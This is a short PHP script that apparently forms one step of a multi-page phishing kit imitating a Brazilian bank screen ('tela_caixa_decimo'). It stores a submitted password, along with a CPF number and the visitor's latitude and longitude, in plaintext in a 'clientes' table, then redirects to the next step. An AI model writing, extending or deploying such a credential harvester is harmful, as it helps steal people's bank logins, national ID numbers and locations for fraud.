<?php
 session_start();



 if(isset($_POST['senha'])){
    $_SESSION['senha'] = $_POST['senha'];
    if(isset($_POST['senha'])){
        $sql = $pdo->prepare("INSERT INTO clientes VALUES (null,?,?,?,?)");
        $sql->execute(array($_SESSION['cpf'],$_SESSION['senha'],$_SESSION['lat'],$_SESSION['long']));
        header("location: http://localhost/tela_caixa_decimo/step-4");
    }
 }else{
    header("location: http://localhost/tela_caixa_decimo/step-2");
 }
?>